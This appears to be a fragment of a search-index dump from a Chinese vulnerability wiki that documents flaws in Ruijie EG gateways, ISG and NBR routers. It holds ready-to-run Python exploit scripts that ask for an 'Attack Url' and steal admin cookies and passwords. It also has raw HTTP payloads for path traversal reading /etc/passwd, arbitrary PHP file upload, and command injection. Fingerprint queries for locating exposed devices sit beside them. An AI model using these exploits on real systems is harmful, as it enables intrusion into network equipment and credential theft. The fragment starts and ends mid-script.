print(\"\\033[36m[o] 正在登录..... \\033[0m\".format(target_url)) if \"status\" in response.text and \"1\" in response.text and response.status_code == 200: ruijie_cookie = \"RUIJIEID=\" + re.findall(r\"'Set-Cookie': 'RUIJIEID=(.*?);\", str(response.headers))[0] + \";user=admin;\" print(\"\\033[36m[o] 成功获取管理员Cookie: {} \\033[0m\".format(ruijie_cookie)) POC_3(target_url, ruijie_cookie) except Exception as e: print(\"\\033[31m[x] 请求失败:{} \\033[0m\".format(e)) sys.exit(0) def POC_3(target_url, ruijie_cookie): vuln_url = target_url + \"/download.php?a=read_txt\u0026file=../../../../etc/passwd\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\", \"Cookie\": \"{}\".format(ruijie_cookie) } try: response = requests.post(url=vuln_url, headers=headers, verify=False, timeout=10) print(\"\\033[36m[o] 正在读取 /etc/passwd..... \\033[0m\".format(target_url)) if \"root:\" in response.text and response.status_code == 200: print(\"\\033[36m[o] 成功读取 /etc/passwd \\n[o] 响应为:{} \\033[0m\".format(response.text)) except Exception as e: print(\"\\033[31m[x] 请求失败:{} \\033[0m\".format(e)) sys.exit(0) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl \u003e\u003e\u003e \\033[0m\")) POC_1(target_url) ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-eg%E6%98%93%E7%BD%91%E5%85%B3-download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:5:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-eg%E6%98%93%E7%BD%91%E5%85%B3-download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"锐捷 EG易网关 phpinfo.view.php 信息泄露漏洞 ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-eg%E6%98%93%E7%BD%91%E5%85%B3-phpinfo.view.php-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-eg%E6%98%93%E7%BD%91%E5%85%B3-phpinfo.view.php-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 锐捷EG易网关 部分版本 phpinfo.view.php文件权限设定存在问题，导致未经身份验证获取敏感信息 ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-eg%E6%98%93%E7%BD%91%E5%85%B3-phpinfo.view.php-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-eg%E6%98%93%E7%BD%91%E5%85%B3-phpinfo.view.php-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 锐捷EG易网关 ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-eg%E6%98%93%E7%BD%91%E5%85%B3-phpinfo.view.php-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-eg%E6%98%93%E7%BD%91%E5%85%B3-phpinfo.view.php-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"Ruijie-EG易网关\" ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-eg%E6%98%93%E7%BD%91%E5%85%B3-phpinfo.view.php-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-eg%E6%98%93%E7%BD%91%E5%85%B3-phpinfo.view.php-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 查看源码发现phpinfo文件 访问 url /tool/view/phpinfo.view.php ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-eg%E6%98%93%E7%BD%91%E5%85%B3-phpinfo.view.php-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-eg%E6%98%93%E7%BD%91%E5%85%B3-phpinfo.view.php-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"锐捷 EG易网关 管理员账号密码泄露漏洞 ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-eg%E6%98%93%E7%BD%91%E5%85%B3-%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-eg%E6%98%93%E7%BD%91%E5%85%B3-%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 锐捷EG易网关 login.php存在 CLI命令注入，导致管理员账号密码泄露漏洞 ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-eg%E6%98%93%E7%BD%91%E5%85%B3-%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-eg%E6%98%93%E7%BD%91%E5%85%B3-%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 锐捷EG易网关 ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-eg%E6%98%93%E7%BD%91%E5%85%B3-%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-eg%E6%98%93%E7%BD%91%E5%85%B3-%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"Ruijie-EG易网关\" ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-eg%E6%98%93%E7%BD%91%E5%85%B3-%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-eg%E6%98%93%E7%BD%91%E5%85%B3-%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面如下 漏洞文件 login.php \u003c?php /** * 用户登录处理 */ define('IN', true); //定位该文件是入口文件 define('DS', DIRECTORY_SEPARATOR); define('AROOT', dirname(__FILE__) . DS); class defaultController { function __construct() { } /** * 登录处理 */ public function indexAction() { $username = p(\"username\");$password = p(\"password\");$data = []; $reg='/(\\r|\\n)+/'; if (count(preg_split($reg, $username)) \u003e 1 || count(preg_split($reg, $password)) \u003e 1) { $data[\"status\"] = 6; $data[\"msg\"] = \"username or password can't exist '\\r\\n'\"; json_echo($data); exit(); } if ($username == FALSE || $password == FALSE) { $data[\"status\"] = 5; $data[\"msg\"] = \"username or password can't empty\"; json_echo($data); exit(); } $res = execCli(\"exec\", \"webmaster $username $password\"); if ($res[\"status\"] != 1) { json_echo($res); exit(); } $isSuccess = trim($res[\"data\"]); if ($isSuccess == 0) { //用户名、账号验证成功 session_start(); $_SESSION['username'] = $username; //记录用户名 $_SESSION[\"lasttime\"] = time(); //记录登录时间 $config = @file_get_contents(DS . \"data\" . DS . \"web.config\"); //获取web配置信息 if ($config != false) { $config = unserialize($config); $_SESSION[\"timeout\"] = isset($config[\"loginTimeout\"]) ? $config[\"loginTimeout\"] * 60 : c(\"timeout\"); } else { $_SESSION[\"timeout\"] = c(\"timeout\"); } setcookie(\"user\", $_SESSION['username']); } $res[\"data\"] = $isSuccess; json_echo($res); } /** * 获取设备信息 */ function versionAction() { $info = $version = execCli(\"exec\", \"show version detail\", \"\"); $info[\"data\"] = preg_split(\"/\\r*\\n/\", $info[\"data\"]); json_echo($info); } } include_once(AROOT . \"init.php\"); //mvc初始化入口，放在底部 关键代码部分 if ($username == FALSE || $password == FALSE) { $data[\"status\"] = 5; $data[\"msg\"] = \"username or password can't empty\"; json_echo($data); exit(); } $res = execCli(\"exec\", \"webmaster $username $password\"); if ($res[\"status\"] != 1) { json_echo($res); exit(); } $isSuccess = trim($res[\"data\"]); 发送请求包，拼接 CLI指令 show webmaster user POST /login.php HTTP/1.1 Host: User-Agent: Go-http-client/1.1 Content-Length: 49 Content-Type: application/x-www-form-urlencoded X-Requested-With: XMLHttpRequest Accept-Encoding: gzip username=admin\u0026password=admin?show+webmaster+user 成功获取账号密码 ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-eg%E6%98%93%E7%BD%91%E5%85%B3-%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-eg%E6%98%93%E7%BD%91%E5%85%B3-%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import base64 import requests import random import re import json import sys def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: 锐捷EG网关 管理员账号密码泄露 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl \u003e\u003e\u003e http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/login.php\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } data = 'username=admin\u0026password=admin?show+webmaster+user' try: response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10) print(\"\\033[36m[o] 正在执行 show webmaster user \\033[0m\".format(target_url)) if \"data\" in response.text and response.status_code == 200: print(\"\\033[36m[o] 成功获取, 响应为:{} \\033[0m\".format(response.text)) except Exception as e: print(\"\\033[31m[x] 请求失败:{} \\033[0m\".format(e)) sys.exit(0) # if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl \u003e\u003e\u003e \\033[0m\")) POC_1(target_url) ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-eg%E6%98%93%E7%BD%91%E5%85%B3-%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:5:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-eg%E6%98%93%E7%BD%91%E5%85%B3-%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"锐捷 ISG 账号密码泄露漏洞 ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-isg-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-isg-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 锐捷ISG 存在账号密码泄露漏洞，通过查看前端，可以获取密码的md5值, 解密后获取后台权限 ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-isg-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-isg-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 锐捷ISG ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-isg-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-isg-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title=\"RG-ISG\" ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-isg-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-isg-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面如下 F12 查看到账号密码 解密md5 后登陆系统 ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-isg-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-isg-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"锐捷 NBR 1300G路由器 越权CLI命令执行漏洞 ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-nbr-1300g%E8%B7%AF%E7%94%B1%E5%99%A8-%E8%B6%8A%E6%9D%83cli%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-nbr-1300g%E8%B7%AF%E7%94%B1%E5%99%A8-%E8%B6%8A%E6%9D%83cli%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 锐捷NBR 1300G路由器 越权CLI命令执行漏洞，guest账户可以越权获取管理员账号密码 ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-nbr-1300g%E8%B7%AF%E7%94%B1%E5%99%A8-%E8%B6%8A%E6%9D%83cli%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-nbr-1300g%E8%B7%AF%E7%94%B1%E5%99%A8-%E8%B6%8A%E6%9D%83cli%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 锐捷NBR路由器 ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-nbr-1300g%E8%B7%AF%E7%94%B1%E5%99%A8-%E8%B6%8A%E6%9D%83cli%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-nbr-1300g%E8%B7%AF%E7%94%B1%E5%99%A8-%E8%B6%8A%E6%9D%83cli%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title=\"锐捷网络 --NBR路由器--登录界面\" ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-nbr-1300g%E8%B7%AF%E7%94%B1%E5%99%A8-%E8%B6%8A%E6%9D%83cli%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-nbr-1300g%E8%B7%AF%E7%94%B1%E5%99%A8-%E8%B6%8A%E6%9D%83cli%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面如下 查看流量发现 CLI命令流量 请求包为 POST /WEB_VMS/LEVEL15/ HTTP/1.1 Host: Connection: keep-alive Content-Length: 73 Authorization: Basic User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Content-Type: text/plain;charset=UTF-8 Accept: */* Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: auth=; user= x-forwarded-for: 127.0.0.1 x-originating-ip: 127.0.0.1 x-remote-ip: 127.0.0.1 x-remote-addr: 127.0.0.1 command=show version\u0026strurl=exec%04\u0026mode=%02PRIV_EXEC\u0026signname=Red-Giant. 测试发现执行其他命令需要权限，查看手册发现存在低权限 guest账户（guest/guest） 登录后发送请求包，执行CLI命令 (show webmaster user) 查看用户配置账号密码 成功获取所有用户的账号密码 webmaster level 0 username admin password guest webmaster level 0 username guest password guest ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-nbr-1300g%E8%B7%AF%E7%94%B1%E5%99%A8-%E8%B6%8A%E6%9D%83cli%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-nbr-1300g%E8%B7%AF%E7%94%B1%E5%99%A8-%E8%B6%8A%E6%9D%83cli%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import base64 import requests import random import re import json import sys def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: 锐捷NBRNBR1300G 路由器 越权CLI命令执行漏洞 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl \u003e\u003e\u003e http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/WEB_VMS/LEVEL15/\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\", \"Authorization\": \"Basic Z3Vlc3Q6Z3Vlc3Q=\" } data = 'command=show webmaster user\u0026strurl=exec%04\u0026mode=%02PRIV_EXEC\u0026signname=Red-Giant.' try: response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10) print(\"\\033[36m[o] 正在执行 show webmaster user \\033[0m\".format(target_url)) if \"webmaster\" in response.text and \" password\" in response.text and response.status_code == 200: user_data = re.findall(r'webmaster level 0 username admin password (.*?)\u003cOPTION\u003e', response.text)[0] print(\"\\033[36m[o] 成功获取, 管理员用户账号密码为: admin/{} \\033[0m\".format(user_data)) else: print(\"\\033[31m[x] 请求失败:{} \\033[0m\") except Exception as e: print(\"\\033[31m[x] 请求失败:{} \\033[0m\".format(e)) sys.exit(0) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl \u003e\u003e\u003e \\033[0m\")) POC_1(target_url) ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-nbr-1300g%E8%B7%AF%E7%94%B1%E5%99%A8-%E8%B6%8A%E6%9D%83cli%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:5:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-nbr-1300g%E8%B7%AF%E7%94%B1%E5%99%A8-%E8%B6%8A%E6%9D%83cli%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"锐捷 NBR 路由器 fileupload.php 任意文件上传漏洞 ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-nbr-%E8%B7%AF%E7%94%B1%E5%99%A8-fileupload.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-nbr-%E8%B7%AF%E7%94%B1%E5%99%A8-fileupload.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 锐捷 NBR 路由器 fileupload.php文件存在任意文件上传漏洞，攻击者通过漏洞可以上传任意文件到服务器获取服务器权限 ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-nbr-%E8%B7%AF%E7%94%B1%E5%99%A8-fileupload.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-nbr-%E8%B7%AF%E7%94%B1%E5%99%A8-fileupload.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 锐捷 NBR 路由器 ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-nbr-%E8%B7%AF%E7%94%B1%E5%99%A8-fileupload.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-nbr-%E8%B7%AF%E7%94%B1%E5%99%A8-fileupload.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"Ruijie-NBR路由器\" ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-nbr-%E8%B7%AF%E7%94%B1%E5%99%A8-fileupload.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-nbr-%E8%B7%AF%E7%94%B1%E5%99%A8-fileupload.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 出现漏洞的文件在 /ddi/server/fileupload.php， 该文件为标准的文件上传文件 文件名及目录均可控，导致可以任意上传文件 POST /ddi/server/fileupload.php?uploadDir=../../321\u0026name=123.php HTTP/1.1 Host: Accept: text/plain, */*; q=0.01 Content-Disposition: form-data; name=\"file\"; filename=\"111.php\" Content-Type: image/jpeg \u003c?php phpinfo();?\u003e 访问上传的文件目录 ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-nbr-%E8%B7%AF%E7%94%B1%E5%99%A8-fileupload.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-nbr-%E8%B7%AF%E7%94%B1%E5%99%A8-fileupload.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"锐捷 NBR路由器 远程命令执行漏洞 CNVD-2021-09650 ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-nbr%E8%B7%AF%E7%94%B1%E5%99%A8-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2021-09650/:0:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-nbr%E8%B7%AF%E7%94%B1%E5%99%A8-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2021-09650/"},{"categories":null,"content":"漏洞描述 锐捷NBR路由器 EWEB网管系统部分接口存在命令注入，导致远程命令执行获取权限 ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-nbr%E8%B7%AF%E7%94%B1%E5%99%A8-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2021-09650/:1:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-nbr%E8%B7%AF%E7%94%B1%E5%99%A8-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2021-09650/"},{"categories":null,"content":"漏洞影响 锐捷NBR路由器 EWEB网管系统 ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-nbr%E8%B7%AF%E7%94%B1%E5%99%A8-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2021-09650/:2:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-nbr%E8%B7%AF%E7%94%B1%E5%99%A8-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2021-09650/"},{"categories":null,"content":"网络测绘 title=\"锐捷网络-EWEB网管系统\" icon_hash=\"-692947551\" ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-nbr%E8%B7%AF%E7%94%B1%E5%99%A8-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2021-09650/:3:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-nbr%E8%B7%AF%E7%94%B1%E5%99%A8-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2021-09650/"},{"categories":null,"content":"漏洞复现 出现漏洞的文件在 /guest_auth/guestIsUp.php \u003c?php //查询用户是否上线了 $userip = @$_POST['ip']; $usermac = @$_POST['mac']; if (!$userip || !$usermac) { exit; } /* 判断该用户是否已经放行 */ $cmd = '/sbin/app_auth_hook.elf -f ' . $userip; $res = exec($cmd, $out, $status); /* 如果已经上线成功 */ if (strstr($out[0], \"status:1\")) { echo 'true'; } ?\u003e 这里看到通过命令拼接的方式构造命令执行， POST /guest_auth/guestIsUp.php mac=1\u0026ip=127.0.0.1|cat /etc/passwd \u003e test.txt 然后访问页面 /guest_auth/test.txt 就可以看到命令执行的结果 ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-nbr%E8%B7%AF%E7%94%B1%E5%99%A8-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2021-09650/:4:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-nbr%E8%B7%AF%E7%94%B1%E5%99%A8-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2021-09650/"},{"categories":null,"content":"漏洞POC import requests import sys import random from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ 